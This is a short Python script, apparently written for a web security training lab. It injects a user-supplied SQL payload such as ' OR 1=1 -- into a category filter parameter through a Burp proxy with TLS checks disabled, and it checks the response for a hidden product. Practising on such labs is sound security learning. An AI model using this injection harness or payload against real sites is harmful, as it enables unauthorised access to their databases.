import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def test_sqli(url, payload):
    full_url = url + "/filter?category=" + payload

    try:

        response = requests.get(full_url, verify=False, proxies=proxies)

        if "Cat Grinning" in response.text:
            return True
        else:
            return False

    except Exception as e:
        print("[!] Error sending request:", e)
        return False


if __name__ == "__main__":
    print("=== LAB SQL Injection Tester (Burp Compatible) ===")
    target_url = input(
        "Enter the lab base URL (e.g., https://0a8f00f00448c45680dd251c0028007d.web-security-academy.net): ").strip()
    sqli_payload = input("Enter the SQL injection payload (e.g., ' OR 1=1 --): ").strip()

    print("\n[+] Testing SQL injection...\n")

    if test_sqli(target_url, sqli_payload):
        print("[✅] SQL injection successful!")
    else:
        print("[❌] SQL injection unsuccessful.")